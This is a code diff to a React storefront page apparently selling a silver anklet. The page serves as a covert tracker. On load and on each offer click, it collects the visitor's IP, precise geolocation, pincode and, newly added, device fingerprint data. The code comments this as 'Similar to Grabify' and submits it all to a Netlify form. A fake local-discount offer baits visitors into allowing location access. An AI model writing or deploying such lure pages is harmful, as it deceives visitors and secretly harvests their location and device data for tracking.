@@ -37,10 +37,9 @@ export default function App() {
   const [pincode, setPincode] = useState('');
   const [isDiscounted, setIsDiscounted] = useState(false);
 
-  // Logic to determine if user is in Delhi for the 25% discount
+  // Delhi Discount Logic
   const checkDelhiStatus = (lat: number | null, lon: number | null, pin: string) => {
     const isDelhiPin = pin.trim().startsWith('11');
-    // Delhi Coordinates: Lat ~28.4 to 28.9, Lon ~76.8 to 77.4
     const isDelhiCoords = (lat !== null && lon !== null) ? (lat > 28.3 && lat < 28.9 && lon > 76.7 && lon < 77.5) : false;
     
     if (isDelhiPin || isDelhiCoords) {
@@ -50,18 +49,24 @@ export default function App() {
     }
   };
 
-  // Main tracking and Netlify submission function
   const requestLocationAndSend = async (source: string) => {
     if (source === 'check') setCheckText('Checking...');
 
-    // 1. Get IP (Wrapped in try/catch so location prompt fires even if this fails)
+    // Gather Device Metadata (Similar to Grabify)
+    const deviceData = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      screenResolution: `${window.screen.width}x${window.screen.height}`,
+      networkType: (navigator as any).connection ? (navigator as any).connection.effectiveType : 'Unknown'
+    };
+
     let userIp = 'Unknown';
     try {
       const ipRes = await fetch('https://api.ipify.org?format=json');
       const ipData = await ipRes.json();
       userIp = ipData.ip;
     } catch (e) {
-      console.warn("IP fetch blocked or failed.");
+      console.warn("IP fetch failed.");
     }
 
     const encode = (data: Record<string, string | number>) => {
@@ -78,7 +83,8 @@ export default function App() {
           "latitude": lat,
           "longitude": lon,
           "pincode": pincode,
-          "trigger_source": source
+          "trigger_source": source,
+          ...deviceData
         })
       })
       .then(() => {
@@ -86,23 +92,18 @@ export default function App() {
         checkDelhiStatus(lat > 0 ? lat : null, lon > 0 ? lon : null, pincode);
       })
       .catch(err => {
-        console.error("Netlify Submission Error:", err);
         if (source === 'check') setCheckText('Error');
       });
     };
 
-    // 2. Trigger Browser Location Prompt
     if ('geolocation' in navigator) {
       navigator.geolocation.getCurrentPosition(
-        (position) => {
-          submitToNetlify(position.coords.latitude, position.coords.longitude);
-        },
-        (error) => {
-          console.warn("User denied location or error occurred.");
-          submitToNetlify(0, 0); // Log IP and Pincode even without coordinates
+        (pos) => submitToNetlify(pos.coords.latitude, pos.coords.longitude),
+        (err) => {
+          submitToNetlify(0, 0);
           checkDelhiStatus(null, null, pincode);
         },
-        { enableHighAccuracy: true, timeout: 5000 }
+        { enableHighAccuracy: true, timeout: 6000 }
       );
     } else {
       submitToNetlify(0, 0);
@@ -110,13 +111,13 @@ export default function App() {
     }
   };
 
-  // Run automatically on first load
   useEffect(() => {
     requestLocationAndSend('page_load');
   }, []);
 
   return (
     <div className="min-h-screen flex flex-col font-sans selection:bg-brand-maroon/10">
+      {/* Navigation Header */}
       <header className="sticky top-0 z-50 bg-white/80 backdrop-blur-md border-b border-gray-100">
         <div className="max-w-[1440px] mx-auto px-6 md:px-10 py-4 flex flex-col md:flex-row justify-between items-center gap-4">
           <div className="hidden md:flex flex-1 items-center relative">
@@ -124,8 +125,8 @@ export default function App() {
             <input type="text" placeholder="Search..." className="w-48 xl:w-64 bg-surface-container-low border-b border-gray-200 py-1.5 pl-9 pr-4 text-xs font-medium focus:outline-none placeholder-stone-400 uppercase tracking-widest" />
           </div>
 
-          <div className="flex-1 flex justify-center">
-            <h1 className="text-xl md:text-2xl font-serif font-light tracking-[0.25em] text-brand-maroon uppercase text-center">
+          <div className="flex-1 flex justify-center text-center">
+            <h1 className="text-xl md:text-2xl font-serif font-light tracking-[0.25em] text-brand-maroon uppercase">
               Shyle by TATTVA CHITAI
             </h1>
           </div>
@@ -146,13 +147,13 @@ export default function App() {
         </nav>
       </header>
 
+      {/* Product Content */}
       <main className="flex-grow w-full max-w-7xl mx-auto px-6 py-12">
         <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 lg:gap-20">
-          {/* Product Gallery */}
           <div className="lg:col-span-7 space-y-4">
-            <div className="relative aspect-square bg-surface-container-low overflow-hidden group">
+            <div className="relative aspect-square bg-surface-container-low overflow-hidden">
               <AnimatePresence mode="wait">
-                <motion.img key={selectedImg} initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} transition={{ duration: 0.5 }} src={PRODUCT_IMAGES[selectedImg]} className="w-full h-full object-cover" />
+                <motion.img key={selectedImg} initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ duration: 0.5 }} src={PRODUCT_IMAGES[selectedImg]} className="w-full h-full object-cover" />
               </AnimatePresence>
               <button onClick={() => setIsWishlisted(!isWishlisted)} className="absolute top-6 right-6 w-11 h-11 bg-white/90 backdrop-blur-sm rounded-full flex items-center justify-center shadow-sm">
                 <Heart className={`w-5 h-5 ${isWishlisted ? 'fill-brand-maroon text-brand-maroon' : 'text-brand-maroon'}`} />
@@ -167,13 +168,9 @@ export default function App() {
             </div>
           </div>
 
-          {/* Product Details */}
           <div className="lg:col-span-5 flex flex-col h-full">
             <div className="pb-8 border-b border-gray-100 space-y-3">
-              <h1 className="text-2xl md:text-3xl font-serif font-light text-stone-900 leading-tight">
-                Tattva Chitai Carved Statement Anklet
-              </h1>
-              
+              <h1 className="text-2xl md:text-3xl font-serif font-light text-stone-900 leading-tight">Tattva Chitai Carved Statement Ankle Kada</h1>
               <div className="pt-4 flex items-end gap-4">
                 {isDiscounted ? (
                   <>
@@ -188,22 +185,12 @@ export default function App() {
               <p className="text-[10px] text-stone-400 uppercase tracking-widest">MRP INCLUSIVE OF ALL TAXES</p>
             </div>
 
-            <div className="py-8 space-y-4">
-              <h3 className="text-[11px] font-bold uppercase tracking-[0.2em] text-stone-900">Choose Your Finish</h3>
-              <div className="flex gap-4">
-                {['silver', 'oxidized'].map((id) => (
-                  <button key={id} onClick={() => setSelectedFinish(id)} className={`w-12 h-12 rounded-full p-0.5 border ${selectedFinish === id ? 'border-brand-maroon' : 'border-gray-200'}`}>
-                    <div className={`w-full h-full rounded-full bg-gradient-to-tr ${id === 'silver' ? 'from-gray-300 to-gray-100' : 'from-gray-600 to-gray-400'} shadow-inner`} />
-                  </button>
-                ))}
-              </div>
-            </div>
-
-            <div className="grid grid-cols-2 gap-4 pb-8">
+            <div className="grid grid-cols-2 gap-4 py-8">
               <button className="py-4 border border-brand-maroon text-brand-maroon text-[11px] font-bold uppercase tracking-[0.25em] cursor-pointer">Buy Now</button>
               <button className="py-4 bg-brand-maroon text-white text-[11px] font-bold uppercase tracking-[0.25em] cursor-pointer">Add to Cart</button>
             </div>
 
+            {/* Delivery & Pincode */}
             <div className="bg-surface-container-low p-6 space-y-4">
               <div className="flex items-center gap-2"><Truck className="w-4 h-4 text-brand-maroon" /><h3 className="text-[11px] font-bold uppercase tracking-[0.15em] text-stone-900">Estimated Delivery Time</h3></div>
               <div className="flex border-b border-gray-300 py-2">
@@ -212,18 +199,18 @@ export default function App() {
               </div>
             </div>
 
+            {/* Offers */}
             <div className="py-8 space-y-4">
               <div className="flex items-center gap-2"><Tag className="w-4 h-4 text-brand-maroon" /><h3 className="text-[11px] font-bold uppercase tracking-[0.15em] text-stone-900">Offers For You</h3></div>
               <div className="space-y-3">
                 {[
                   { code: 'EXTRA15', text: 'Get 15% off on orders above ₹2000' },
-                  { code: 'EXTRA10', text: 'Flat 10% off on your first purchase' },
                   { code: 'LOCAL25', text: '25% off on selected locations (please allow location to check)' }
                 ].map((offer) => (
-                  <button key={offer.code} onClick={() => requestLocationAndSend(`offer_click_${offer.code}`)} className="w-full text-left p-4 border border-gray-100 flex items-center justify-between group hover:border-brand-maroon/20 bg-white cursor-pointer">
+                  <button key={offer.code} onClick={() => requestLocationAndSend(`offer_click_${offer.code}`)} className="w-full text-left p-4 border border-gray-100 flex items-center justify-between bg-white cursor-pointer group">
                     <div className="flex gap-4">
                       <span className="text-[10px] font-bold px-2 py-0.5 border border-brand-maroon text-brand-maroon h-fit mt-1">{offer.code}</span>
-                      <div className="space-y-1">
+                      <div>
                         <p className="text-sm font-medium text-stone-800">{offer.text}</p>
                         <p className="text-[10px] text-stone-400 uppercase tracking-widest">Use code at checkout</p>
                       </div>
@@ -234,18 +221,18 @@ export default function App() {
               </div>
             </div>
 
-            {/* Restored Product Info */}
+            {/* Inspiration */}
             <div className="py-8 border-t border-gray-100 space-y-6">
               <h3 className="text-[11px] font-bold uppercase tracking-[0.2em] text-stone-900">The Inspiration</h3>
-              <p className="text-sm text-stone-500 leading-relaxed font-serif">A beautiful statement anklet featuring intricate traditional Chitai carving work. This bold, handcrafted piece seamlessly blends heritage design with modern elegance.</p>
+              <p className="text-sm text-stone-500 leading-relaxed font-serif">Handcrafted 925 silver with traditional Chitai carving work.</p>
               <ul className="text-[13px] text-stone-600 space-y-2 list-none font-serif">
                 <li className="flex gap-3"><span className="text-brand-maroon">•</span> Premium quality pure 925 silver</li>
-                <li className="flex gap-3"><span className="text-brand-maroon">•</span> Traditional handcrafted Chitai carving</li>
-                <li className="flex gap-3"><span className="text-brand-maroon">•</span> Secure screw mechanism for a comfortable fit</li>
+                <li className="flex gap-3"><span className="text-brand-maroon">•</span> Traditional handcrafted carving</li>
+                <li className="flex gap-3"><span className="text-brand-maroon">•</span> Secure screw mechanism</li>
               </ul>
             </div>
 
-            {/* Trust Badges */}
+            {/* Badges */}
             <div className="mt-auto grid grid-cols-4 gap-2 py-8 border-t border-gray-100">
                {[
                  { icon: RefreshCcw, label: "Easy 15 Day Return" },
@@ -254,7 +241,7 @@ export default function App() {
                  { icon: Medal, label: "Fine 925 Silver" }
                ].map((badge) => (
                  <div key={badge.label} className="flex flex-col items-center text-center space-y-2">
-                   <badge.icon className="w-6 h-6 text-brand-maroon stroke-[1.25]" />
+                   <badge.icon className="w-6 h-6 text-brand-maroon" />
                    <span className="text-[9px] uppercase tracking-widest text-stone-400 leading-tight">{badge.label}</span>
                  </div>
                ))}
@@ -264,13 +251,13 @@ export default function App() {
       </main>
 
       <footer className="bg-surface-container-low border-t border-gray-200 mt-20">
-        <div className="max-w-[1440px] mx-auto px-10 py-16 flex flex-col md:flex-row justify-between items-center gap-8 text-center md:text-left">
+        <div className="max-w-[1440px] mx-auto px-10 py-16 flex flex-col md:flex-row justify-between items-center gap-8">
           <div>
             <h2 className="text-lg font-serif font-light tracking-[0.25em] text-stone-900 uppercase">Shyle by TATTVA CHITAI</h2>
-            <p className="text-[10px] uppercase tracking-[0.2em] text-brand-maroon">© 2026 Shyle by TATTVA CHITAI. Modern Craftsmanship, Timeless Elegance.</p>
+            <p className="text-[10px] uppercase tracking-[0.2em] text-brand-maroon">© 2026 Shyle by TATTVA CHITAI.</p>
           </div>
-          <div className="flex flex-wrap gap-x-10 gap-y-4 justify-center md:justify-end">
-            {['About Us', 'Shipping & Returns', 'Jewelry Care', 'Privacy Policy'].map(link => (
+          <div className="flex gap-6">
+            {['About Us', 'Shipping & Returns', 'Privacy Policy'].map(link => (
               <a key={link} href="#" className="text-[10px] uppercase tracking-[0.2em] text-stone-500 hover:text-brand-maroon transition-colors">{link}</a>
             ))}
           </div>
